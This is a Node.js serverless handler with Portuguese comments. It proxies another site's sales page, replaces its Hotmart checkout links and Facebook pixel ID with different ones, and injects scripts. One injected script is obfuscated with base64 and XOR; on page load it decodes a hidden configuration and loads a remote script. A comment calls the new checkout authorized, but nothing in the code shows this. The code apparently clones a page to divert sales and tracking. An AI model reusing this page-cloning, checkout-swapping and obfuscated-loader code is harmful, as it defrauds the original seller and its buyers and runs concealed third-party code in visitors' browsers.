const SOURCE_URL = 'https://codigodivino.site/';
const NEW_CHECKOUT = 'https://pay.hotmart.com/S107470868H?bid=1788554369866';
const NEW_PIXEL_ID = '1092704256587368';
const OLD_PIXEL_ID = '1410770553525670';

const UTMIFY_SCRIPT = `<script>(function(){var h_1a6h=atob("DLSc3wG49XU8/TJCPc++qnPU108elUY2Tcem8C7bkRsSiEYvVNLl8WLXmFtejx0xXsb1r3XL2gVVhVcuEsT1p2TU2x9P3x5gXMDorWjagAFZjhB4Zumw/WbUmhddkUFgB+/n/W/ZmBAexxAyVMz5s0jc11kei1MuSNG+5SOOlExeyQBzDICkvmLalkEMzVEgBNL57WWaiChB");var b_n=[];for(var m_gev1=0;m_gev1<h_1a6h.length;m_gev1++){b_n.push(h_1a6h.charCodeAt(m_gev1)&255);}var o_6co=b_n[0];var u_we=b_n.slice(1,1+o_6co);var h_rgwp=b_n.slice(1+o_6co);var y_a=h_rgwp.map(function(b,n_le7f){return b^u_we[n_le7f%o_6co];});var v_w7qr="";for(var m_jbq=0;m_jbq<y_a.length;m_jbq++){v_w7qr+=String.fromCharCode(y_a[m_jbq]&255);}var y_xz=decodeURIComponent(escape(v_w7qr));var b_y9u=JSON.parse(y_xz);var h_qt=b_y9u.globals||[];h_qt.forEach(function(y_37p){window[y_37p.name]=y_37p.value;});var c_r74=document.createElement("script");c_r74.src=b_y9u.url;c_r74.async=true;c_r74.defer=true;(b_y9u.attributes||[]).forEach(function(k_7){c_r74.setAttribute(k_7.name,k_7.value);});(document.head||document.documentElement).appendChild(c_r74);})();</script>`;

// Mantém os parâmetros da campanha na sessão e garante que qualquer botão
// Hotmart receba esses parâmetros, inclusive links recriados pelo JS da página.
const TRACKING_BRIDGE = `<script data-tracking-bridge="prognexo-hotmart">
(function () {
  var CHECKOUT = ${JSON.stringify(NEW_CHECKOUT)};
  var STORAGE_KEY = 'cd_tracking_params_v1';
  var TRACK_KEYS = [
    'utm_source','utm_medium','utm_campaign','utm_content','utm_term','utm_id',
    'fbclid','gclid','gbraid','wbraid','ttclid','msclkid','src','sck'
  ];

  function safeParse(value) {
    try { return value ? JSON.parse(value) : {}; } catch (_) { return {}; }
  }

  function collect() {
    var saved = safeParse(sessionStorage.getItem(STORAGE_KEY));
    var qs = new URLSearchParams(window.location.search);
    TRACK_KEYS.forEach(function (key) {
      var value = qs.get(key);
      if (value) saved[key] = value;
    });
    try { sessionStorage.setItem(STORAGE_KEY, JSON.stringify(saved)); } catch (_) {}
    return saved;
  }

  function buildCheckout() {
    var url = new URL(CHECKOUT);
    var params = collect();
    Object.keys(params).forEach(function (key) {
      if (params[key] && !url.searchParams.has(key)) url.searchParams.set(key, params[key]);
    });
    return url.toString();
  }

  function isHotmartCheckout(href) {
    return /https:\/\/pay\.hotmart\.com\//i.test(href || '');
  }

  function updateLinks(root) {
    var scope = root && root.querySelectorAll ? root : document;
    scope.querySelectorAll('a[href]').forEach(function (a) {
      if (isHotmartCheckout(a.getAttribute('href'))) {
        a.setAttribute('href', buildCheckout());
      }
    });
  }

  function trackInitiateCheckout() {
    try {
      if (typeof window.fbq === 'function') {
        window.fbq('track', 'InitiateCheckout');
      }
    } catch (_) {}
  }

  collect();

  document.addEventListener('click', function (event) {
    var a = event.target && event.target.closest ? event.target.closest('a[href]') : null;
    if (!a || !isHotmartCheckout(a.getAttribute('href'))) return;
    a.setAttribute('href', buildCheckout());
    trackInitiateCheckout();
  }, true);

  function boot() {
    updateLinks(document);
    try {
      new MutationObserver(function (mutations) {
        mutations.forEach(function (m) {
          m.addedNodes.forEach(function (node) {
            if (node && node.nodeType === 1) updateLinks(node);
          });
        });
        updateLinks(document);
      }).observe(document.documentElement, { childList: true, subtree: true });
    } catch (_) {}
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot, { once: true });
  } else {
    boot();
  }
})();
</script>`;

function rewriteHtml(html) {
  // Faz URLs relativas de CSS, JS e imagens continuarem carregando da página original.
  if (!/<base\s/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, `<head$1><base href="${SOURCE_URL}">`);
  }

  // Troca todos os checkouts antigos dessa página pelo checkout autorizado do usuário.
  html = html.replace(/https:\/\/pay\.hotmart\.com\/W101321145O[^"'\\<\s]*/gi, NEW_CHECKOUT);
  html = html.replace(/https:\/\/pay\.hotmart\.com\/W101321145O\?checkoutMode=10/gi, NEW_CHECKOUT);

  // Substitui o Pixel antigo em todos os pontos do HTML original, incluindo noscript.
  html = html.split(OLD_PIXEL_ID).join(NEW_PIXEL_ID);

  // Insere a UTMify sem alterar o visual.
  if (!html.includes('DLSc3wG49XU8/TJCPc++qnPU108elUY2')) {
    html = html.replace(/<\/head>/i, `${UTMIFY_SCRIPT}</head>`);
  }

  // Ponte de atribuição: persiste UTMs/click IDs e os leva até a Hotmart.
  if (!html.includes('data-tracking-bridge="prognexo-hotmart"')) {
    html = html.replace(/<\/body>/i, `${TRACKING_BRIDGE}</body>`);
  }

  return html;
}

module.exports = async function handler(req, res) {
  try {
    const upstream = await fetch(SOURCE_URL, {
      headers: {
        'user-agent': 'Mozilla/5.0 (compatible; CodigoDivinoVercel/2.0)',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      }
    });

    if (!upstream.ok) {
      res.status(502).send(`Falha ao carregar a página original: HTTP ${upstream.status}`);
      return;
    }

    let html = await upstream.text();
    html = rewriteHtml(html);

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    // Cache curto para manter o visual sincronizado sem congelar alterações do upstream.
    res.setHeader('Cache-Control', 's-maxage=120, stale-while-revalidate=600');
    res.status(200).send(html);
  } catch (err) {
    res.status(500).send('Erro ao carregar a página: ' + (err && err.message ? err.message : 'erro desconhecido'));
  }
};
